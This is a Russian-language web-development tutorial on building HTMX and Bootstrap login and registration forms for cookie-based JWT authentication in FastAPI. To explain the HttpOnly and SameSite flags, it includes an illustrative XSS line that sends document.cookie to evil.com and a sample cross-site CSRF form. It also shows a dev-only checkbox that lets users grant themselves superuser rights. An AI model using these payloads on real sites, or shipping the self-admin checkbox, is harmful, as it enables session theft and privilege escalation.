# 📚 Занятие №2: Cookie-Based Authentication (Часть 2)

## Коммит: Создание HTML-форм для входа и регистрации

---

## 🎯 Что мы делали

В предыдущей части мы создали механизм извлечения пользователя из cookie. Теперь нам нужны формы, через которые пользователь сможет зарегистрироваться и войти в систему.

Когда мы работали с API-подходом, фронтенд отправлял JSON на эндпоинт `/auth/login`, получал токен в ответе и сохранял его в `localStorage`. При каждом последующем запросе JavaScript-код должен был вручную добавлять этот токен в заголовок `Authorization: Bearer <token>`. Это хорошо работает для SPA приложений на React или Vue, но совершенно не подходит для классического server-side rendering.

Проблема в том, что обычные HTML-формы физически не могут отправлять кастомные заголовки. Они умеют только POST данные в формате `application/x-www-form-urlencoded` или `multipart/form-data`. Браузер также не может автоматически добавлять токены из `localStorage` к каждому запросу. А самое главное — когда пользователь впервые открывает страницу, JavaScript ещё не загрузился, и страница не знает о токене.

Именно поэтому мы переходим на Cookie-Based Authentication. JWT токен будет храниться в HTTP-only cookie, которую браузер автоматически прикрепляет к каждому запросу. Не нужен JavaScript для работы с токеном, не нужны заголовки — всё работает на уровне протокола HTTP.

---

## 📄 Создание шаблона auth.html

Мы создали файл `templates/auth.html`, который содержит одну страницу с двумя вкладками — "Вход" и "Регистрация". Это классическая схема, которую вы видели на множестве сайтов: пользователь может переключаться между формами без перезагрузки страницы.

Такой подход удобнее, чем создавать две отдельные страницы `/auth/login` и `/auth/register`. Во-первых, пользователь сразу видит оба варианта и может быстро переключиться. Во-вторых, это меньше HTTP-запросов и дублирования кода — вся разметка находится в одном файле.

Переключение между вкладками реализовано через **Bootstrap Tabs**. Это готовый JavaScript-компонент, который показывает и скрывает блоки контента при клике на вкладку. Нам не нужно писать свой код — достаточно правильно расставить CSS-классы и HTML-атрибуты.

---

## 🏗️ Анатомия формы входа

Базовая структура формы выглядит так:

```html
<form 
    hx-post="/auth/login-form"
    hx-target="body"
    hx-swap="outerHTML"
>
    <input name="username" type="email" required>
    <input name="password" type="password" required>
    <button type="submit">Войти</button>
</form>
```

Здесь есть несколько важных моментов. Сначала поговорим про атрибут `name="username"`. Почему не `name="email"`, если мы вводим именно email?

Дело в том, что FastAPI Users использует стандарт **OAuth2PasswordRequestForm**. Это готовая Pydantic-модель, которая ожидает два поля: `username` и `password`. Исторически в OAuth2 поле для логина называется именно `username`, даже если там email. Это просто соглашение, которому мы должны следовать.

На бэкенде мы получаем эти данные через `OAuth2PasswordRequestForm = Depends()`, и в `form_data.username` будет содержаться email пользователя. Затем мы передаём его в `user_manager.authenticate` с ключом `"email"`, потому что наша модель User использует email как идентификатор.

---

## 🚀 HTMX: формы без перезагрузки страницы

Теперь про HTMX. Обычная HTML-форма работает так: пользователь нажимает "Войти", браузер отправляет POST-запрос, сервер отвечает HTML, и браузер **полностью перезагружает страницу**. Это классическое поведение веба с 1990-х годов.

Проблема в том, что перезагрузка теряет состояние: scroll position, открытые модальные окна, несохранённые данные в других формах. Современные пользователи ожидают плавных переходов без "моргания" страницы.

HTMX решает эту проблему элегантно. Когда мы добавляем атрибут `hx-post="/auth/login-form"`, HTMX перехватывает событие submit формы и вместо обычной отправки делает AJAX-запрос. Сервер отвечает HTML-фрагментом, и HTMX **заменяет только нужную часть страницы**, не трогая остальное.

В нашем случае мы используем `hx-target="body"` и `hx-swap="outerHTML"`. Это означает: после успешного входа заменить **весь** body новым HTML. Визуально это выглядит как редирект на главную страницу, но технически страница не перезагружается — HTMX просто подменяет DOM.

Почему нужно заменять весь body, а не только форму? Потому что после входа меняется вся структура страницы: появляется навбар с именем пользователя, admin видит дополнительные кнопки, и так далее. Проще заменить всё целиком, чем выборочно обновлять десятки элементов.

---

## 🍪 Как устанавливается cookie

Когда пользователь успешно логинится, сервер отвечает с HTTP-заголовком:

```
Set-Cookie: access_token=eyJhbGci...; Path=/; HttpOnly; SameSite=Lax
```

Давайте разберём каждый параметр. **Path=/** означает, что cookie будет отправляться для всех URL нашего сайта — и для главной страницы `/`, и для `/products`, и для `/admin`. Если бы мы указали `Path=/admin`, cookie отправлялась бы только для админских страниц.

**HttpOnly** — это критически важный параметр безопасности. Он запрещает JavaScript читать эту cookie через `document.cookie`. Представьте, что на вашем сайте есть XSS-уязвимость (например, пользователь может вставить `<script>` в комментарий). Без HttpOnly злоумышленник мог бы украсть токен:

```javascript
fetch('https://evil.com/steal?token=' + document.cookie)
```

Но с `HttpOnly=true` JavaScript физически не видит эту cookie. Браузер отправляет её только серверу, и никакой скрипт не может к ней подобраться.

**SameSite=Lax** защищает от CSRF-атак. Без этого параметра злоумышленник мог бы создать сайт с формой:

```html
<form action="https://your-shop.com/admin/delete-all" method="POST">
    <button>Кликни на котика!</button>
</form>
```

Если у пользователя есть активная сессия на вашем сайте, браузер бы автоматически приложил cookie к этому POST-запросу, и команда выполнилась бы. `SameSite=Lax` блокирует отправку cookie при POST-запросах с других доменов.

---

## 🔄 Форма регистрации: дополнительные поля

Форма регистрации почти идентична форме входа, но добавляется чекбокс `is_superuser`:

```html
<input name="is_superuser" type="checkbox">
```

Здесь есть важная особенность HTML. Когда чекбокс **установлен**, браузер отправляет `is_superuser=on`. Когда **не установлен** — вообще не отправляет это поле. То есть в FormData просто не будет ключа `is_superuser`.

На бэкенде мы обрабатываем это так:

```python
is_superuser: str = Form(None)  # Может быть "on" или None
is_super = (is_superuser == "on")  # Преобразуем в boolean
```

Конечно, в реальном production-приложении **нельзя** позволять пользователям самим делать себя админами! Этот чекбокс нужен только для разработки и тестирования. В продакшене создание админов должно идти через защищённую команду CLI, отдельный endpoint с дополнительной авторизацией, или прямое редактирование базы данных.

---

## 📡 Что происходит при отправке формы

Давайте пошагово проследим весь процесс входа в систему.

Пользователь вводит email и пароль, нажимает кнопку "Войти". HTMX перехватывает событие submit и отправляет POST-запрос на `/auth/login-form`. Тело запроса имеет формат `application/x-www-form-urlencoded`:

```
username=user@example.com&password=secret123
```

На сервере FastAPI парсит это в `OAuth2PasswordRequestForm`. Мы передаём данные в `user_manager.authenticate`, который проверяет: существует ли пользователь с таким email? Совпадает ли хеш пароля?

Если всё ок, генерируется JWT токен с payload:

```json
{
  "sub": "3",
  "aud": ["fastapi-users:auth"],
  "exp": 1764191530
}
```

Токен подписывается с помощью `SECRET_KEY` и возвращается в заголовке `Set-Cookie`. Одновременно сервер рендерит шаблон `index.html` с данными пользователя (email, is_superuser) и отправляет его в теле ответа.

HTMX получает HTML и заменяет весь `<body>` страницы. Визуально это выглядит как редирект на главную, но без полной перезагрузки. Браузер автоматически сохраняет cookie из заголовка `Set-Cookie`.

Теперь при каждом последующем запросе (переход по ссылке, отправка формы, HTMX-запрос) браузер будет автоматически прикладывать эту cookie. Никакого JavaScript для этого не нужно — это встроенное поведение браузера.

---

## 🎭 Bootstrap Tabs: как они работают

Bootstrap Tabs состоят из двух частей: навигации и контента.

Навигация — это список ссылок с классом `nav nav-tabs`:

```html
<ul class="nav nav-tabs">
    <li class="nav-item">
        <a class="nav-link active" data-bs-toggle="tab" href="#login-tab">
            Вход
        </a>
    </li>
    <li class="nav-item">
        <a class="nav-link" data-bs-toggle="tab" href="#register-tab">
            Регистрация
        </a>
    </li>
</ul>
```

Контент — это блоки с классом `tab-pane`:

```html
<div class="tab-content">
    <div class="tab-pane active" id="login-tab">
        <!-- Форма входа -->
    </div>
    <div class="tab-pane" id="register-tab">
        <!-- Форма регистрации -->
    </div>
</div>
```

Атрибут `data-bs-toggle="tab"` говорит Bootstrap, что это элемент управления вкладками. `href="#login-tab"` связывает ссылку с контентом через ID. Класс `active` указывает, какая вкладка должна быть видна изначально.

Bootstrap JavaScript автоматически обрабатывает клики: скрывает все `.tab-pane`, показывает только нужный, обновляет класс `active` на ссылках. Нам не нужно писать ни строчки JavaScript — всё работает из коробки.

---

## 🛡️ Валидация на клиенте и сервере

HTML5 даёт нам базовую валидацию через атрибуты `required` и `type="email"`.

Атрибут `required` не позволяет отправить форму с пустым полем. Браузер показывает нативное сообщение "Заполните это поле" ещё до отправки на сервер. Это хороший UX — пользователь мгновенно видит ошибку.

Атрибут `type="email"` проверяет базовый формат email (наличие `@` и точки). На мобильных устройствах это также меняет клавиатуру — появляется кнопка с символом `@` для удобства.

Но клиентская валидация **не заменяет** серверную! Любой пользователь может открыть Developer Tools, убрать атрибут `required` и отправить пустую форму. Или вообще отправить запрос через curl, минуя браузер.

Поэтому на сервере мы обязательно проверяем данные повторно. Если пользователь не найден или пароль неправильный, мы возвращаем ту же страницу с сообщением об ошибке.

Важный момент безопасности: для обеих ошибок (пользователь не существует / пароль неправильный) мы показываем **одинаковое** сообщение — "Неверный email или пароль". Почему?

Если мы скажем "Пользователь с таким email не зарегистрирован", злоумышленник сможет перебирать email'ы и узнавать, кто пользуется вашим сервисом. Это называется **user enumeration**. Общее сообщение об ошибке не даёт понять, что именно пошло не так.

---

## 💡 Резюме

Мы создали HTML-шаблон `auth.html` с двумя вкладками — для входа и регистрации. Использовали Bootstrap Tabs для переключения между формами без перезагрузки. Применили HTMX для отправки форм через AJAX вместо классического POST с полной перезагрузкой страницы.

Ключевая концепция — замена всего body после успешного входа. Это даёт эффект редиректа на главную страницу, но технически страница не перезагружается. HTMX просто заменяет DOM, сохраняя плавность переходов.

Cookie устанавливается через заголовок `Set-Cookie` с параметрами `HttpOnly` и `SameSite=Lax` для защиты от XSS и CSRF. Браузер автоматически прикладывает эту cookie к каждому последующему запросу — не нужен JavaScript, не нужны заголовки.

В следующей части мы создадим бэкенд-роуты `/auth/login-form` и `/auth/register-form`, которые будут обрабатывать эти формы, проверять учётные данные и устанавливать cookie с JWT токеном.
